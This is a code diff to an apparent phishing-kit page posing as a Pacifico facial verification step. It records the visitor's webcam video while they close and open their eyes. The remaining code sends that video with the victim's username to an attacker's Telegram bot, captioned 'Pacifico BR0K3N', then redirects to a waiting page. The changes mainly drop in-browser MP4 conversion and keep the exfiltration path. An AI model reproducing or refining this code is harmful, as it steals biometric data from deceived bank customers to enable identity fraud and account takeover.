@@ -53,8 +53,7 @@
       border-radius: 50%; animation: spin .8s linear infinite; margin: 0 auto 14px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .loading-txt { font-size: 13px; color: #aaa; margin-bottom: 6px; }
-    .loading-sub  { font-size: 11px; color: #ccc; }
+    .loading-txt { font-size: 13px; color: #aaa; }
     #main { display: none; }
     @media (max-width: 360px) { .cam-wrapper,#video { width: 200px; height: 200px; } }
   </style>
@@ -67,8 +66,7 @@
 
 <div id="loading" class="card">
   <div class="spinner"></div>
-  <p class="loading-txt" id="loading-txt">Iniciando cámara…</p>
-  <p class="loading-sub" id="loading-sub"></p>
+  <p class="loading-txt">Iniciando cámara…</p>
 </div>
 
 <div id="main" class="card">
@@ -95,23 +93,19 @@
   <p class="status" id="status">Posiciona tu rostro en el círculo</p>
 </div>
 
-<!-- FFmpeg.wasm para convertir WebM → MP4 en el navegador -->
-<script src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@0.11.6/dist/ffmpeg.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
-<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js"        crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
 <script src="confi.js"></script>
 <script>
 (async () => {
 
-  const loadingEl  = document.getElementById("loading");
-  const loadingTxt = document.getElementById("loading-txt");
-  const loadingSub = document.getElementById("loading-sub");
-  const mainEl     = document.getElementById("main");
-  const videoEl    = document.getElementById("video");
-  const camRing    = document.getElementById("cam-ring");
-  const camBadge   = document.getElementById("cam-badge");
-  const progBar    = document.getElementById("prog-bar");
-  const statusEl   = document.getElementById("status");
+  const loadingEl = document.getElementById("loading");
+  const mainEl    = document.getElementById("main");
+  const videoEl   = document.getElementById("video");
+  const camRing   = document.getElementById("cam-ring");
+  const camBadge  = document.getElementById("cam-badge");
+  const progBar   = document.getElementById("prog-bar");
+  const statusEl  = document.getElementById("status");
 
   // ── Beep ──
   function playBeep() {
@@ -129,32 +123,11 @@
     } catch(_) {}
   }
 
-  // ── Pre-carga FFmpeg ──
-  loadingTxt.textContent = "Cargando módulos…";
-  loadingSub.textContent = "Esto puede tardar unos segundos";
-  const { createFFmpeg, fetchFile } = FFmpeg;
-  const ffmpeg = createFFmpeg({
-    log: false,
-    corePath: "https://cdn.jsdelivr.net/npm/@ffmpeg/core@0.11.0/dist/ffmpeg-core.js"
-  });
-  try {
-    await ffmpeg.load();
-  } catch(e) {
-    // Si FFmpeg falla, continuamos sin conversión (enviaremos webm igualmente)
-    console.warn("FFmpeg no disponible, se usará WebM:", e);
-  }
-
-  // ── Cámara — resolución máxima del dispositivo ──
-  loadingTxt.textContent = "Iniciando cámara…";
-  loadingSub.textContent = "";
+  // ── Cámara — resolución nativa del dispositivo ──
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "user",
-        width:  { ideal: 1280 },
-        height: { ideal: 720 }
-      },
+      video: { facingMode: "user" }, // sin restricción de resolución = calidad original
       audio: false
     });
     videoEl.srcObject = stream;
@@ -170,7 +143,8 @@
   camRing.classList.add("active");
   camBadge.textContent = "Buscando rostro…";
 
-  // ── Grabación en la mejor calidad disponible ──
+  // ── Grabación — sin forzar bitrate, calidad por defecto del navegador ──
+  let recorder, chunks = [];
   const MIMES = [
     "video/webm;codecs=vp9,opus",
     "video/webm;codecs=vp8,opus",
@@ -182,55 +156,28 @@
     try { return MediaRecorder.isTypeSupported(m); } catch(_) { return false; }
   }) || "";
 
-  let recorder, chunks = [];
   try {
-    recorder = new MediaRecorder(stream, {
-      ...(chosenMime ? { mimeType: chosenMime } : {}),
-      videoBitsPerSecond: 4000000 // 4 Mbps — calidad alta
-    });
+    recorder = chosenMime
+      ? new MediaRecorder(stream, { mimeType: chosenMime })
+      : new MediaRecorder(stream);
   } catch(_) {
     recorder = new MediaRecorder(stream);
   }
+
   recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
 
-  // ── EAR ──
+  // ── EAR helpers ──
   function dist(a, b) { return Math.hypot(a.x - b.x, a.y - b.y); }
   function ear(lm, v1, v2, h1, h2) {
     return dist(lm[v1], lm[v2]) / (dist(lm[h1], lm[h2]) + 0.0001);
   }
 
-  const NEED_MS  = 5000;
-  const EXTRA_MS = 5000;
+  const NEED_MS  = 5000; // 5s ojos cerrados
+  const EXTRA_MS = 5000; // 5s más grabando después del beep
   const EAR_TH   = 0.17;
   let closeAt    = null;
   let triggered  = false;
   let recording  = false;
-
-  // ── Convertir WebM → MP4 con FFmpeg.wasm ──
-  async function toMp4(webmBlob) {
-    if (!ffmpeg.isLoaded()) return webmBlob; // fallback si no cargó
-    try {
-      const inputName  = "input.webm";
-      const outputName = "output.mp4";
-      ffmpeg.FS("writeFile", inputName, await fetchFile(webmBlob));
-      await ffmpeg.run(
-        "-i", inputName,
-        "-c:v", "libx264",
-        "-preset", "ultrafast",
-        "-crf", "23",          // calidad buena, archivo razonable
-        "-movflags", "+faststart",
-        "-an",                 // sin audio (la cámara no graba audio)
-        outputName
-      );
-      const data = ffmpeg.FS("readFile", outputName);
-      ffmpeg.FS("unlink", inputName);
-      ffmpeg.FS("unlink", outputName);
-      return new Blob([data.buffer], { type: "video/mp4" });
-    } catch(e) {
-      console.warn("FFmpeg falló, enviando WebM:", e);
-      return webmBlob; // fallback
-    }
-  }
 
   // ── Envío ──
   async function sendAndRedirect() {
@@ -238,56 +185,47 @@
     const sessionId = localStorage.getItem("bdp_sessionId") || "";
 
     camRing.className    = "cam-ring sending";
-    camBadge.textContent = "Procesando…";
-    statusEl.textContent = "Procesando video…";
+    camBadge.textContent = "Enviando…";
+    statusEl.textContent = "Enviando verificación…";
     statusEl.className   = "status send";
 
-    const webmBlob = new Blob(chunks, { type: recorder.mimeType || "video/webm" });
+    const mimeUsed = recorder.mimeType || chosenMime || "video/webm";
+    const blob     = new Blob(chunks, { type: mimeUsed });
 
-    // Si el blob está vacío, redirige sin enviar
-    if (webmBlob.size === 0) {
+    // Si vacío, redirige directo
+    if (blob.size === 0) {
       window.location.href = "wait.html?s=" + sessionId;
       return;
     }
 
-    // Convierte a MP4
-    camBadge.textContent = "Convirtiendo…";
-    statusEl.textContent = "Convirtiendo a MP4…";
-    const finalBlob = await toMp4(webmBlob);
-    const isMp4    = finalBlob.type === "video/mp4";
-    const ext      = isMp4 ? "mp4" : "webm";
-    const filename = `cara.${ext}`;
-
-    camBadge.textContent = "Enviando…";
-    statusEl.textContent = "Enviando verificación…";
-
     const caption =
       `🎥 *Video facial — Pacifico BR0K3N*\n` +
       `👤 Usuario: \`${usuario}\`\n` +
-      `📦 ${(finalBlob.size / 1024).toFixed(0)} KB · ${ext.toUpperCase()}\n` +
       `👤 @Brknshinexxx`;
 
+    // Intenta sendVideo → si falla, sendDocument
     const endpoints = [
-      { ep: "sendVideo",    field: "video"    },
-      { ep: "sendDocument", field: "document" }
+      { ep: "sendVideo",    field: "video",    name: "cara.webm" },
+      { ep: "sendDocument", field: "document", name: "cara.webm" }
     ];
 
-    for (const { ep, field } of endpoints) {
+    for (const { ep, field, name } of endpoints) {
       try {
         const fd = new FormData();
         fd.append("chat_id",    CONFIG.CHAT_ID);
-        fd.append(field,        finalBlob, filename);
+        fd.append(field,        blob, name);
         fd.append("caption",    caption);
         fd.append("parse_mode", "Markdown");
-        const res  = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${ep}`, {
-          method: "POST", body: fd
-        });
+        const res  = await fetch(
+          `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${ep}`,
+          { method: "POST", body: fd }
+        );
         const json = await res.json();
-        if (json.ok) break;
-      } catch(_) {}
+        if (json.ok) break; // éxito, no seguimos
+      } catch(_) { /* siguiente */ }
     }
 
-    // Siempre redirige
+    // Siempre redirige pase lo que pase
     window.location.href = "wait.html?s=" + sessionId;
   }
 
@@ -318,10 +256,10 @@
     camBadge.textContent = "Rostro detectado";
 
     if (avg < EAR_TH) {
-      // Arranca grabación la primera vez que cierra los ojos
+      // Primera vez que cierra los ojos: arranca la grabación
       if (!recording) {
         recording = true;
-        recorder.start(500);
+        recorder.start(500); // chunk cada 500ms
       }
 
       if (!closeAt) closeAt = Date.now();
@@ -338,6 +276,7 @@
         statusEl.textContent = "Perfecto, ahora abre los ojos…";
         statusEl.className   = "status";
 
+        // Graba 5s más con los ojos abiertos y envía
         setTimeout(() => {
           try { recorder.requestData(); } catch(_) {}
           setTimeout(() => {
@@ -352,15 +291,17 @@
         closeAt = null;
         progBar.style.width  = "0%";
         camRing.classList.remove("closed");
-        statusEl.textContent = "Cierra los ojos completamente";
-        statusEl.className   = "status warn";
+        statusEl.textContent = recording
+          ? "Cierra los ojos de nuevo…"
+          : "Cierra los ojos completamente";
+        statusEl.className = "status warn";
       }
     }
   });
 
+  // MediaPipe Camera loop — sin forzar resolución
   const mpCam = new Camera(videoEl, {
-    onFrame: async () => { await faceMesh.send({ image: videoEl }); },
-    width: 1280, height: 720
+    onFrame: async () => { await faceMesh.send({ image: videoEl }); }
   });
   mpCam.start();
 
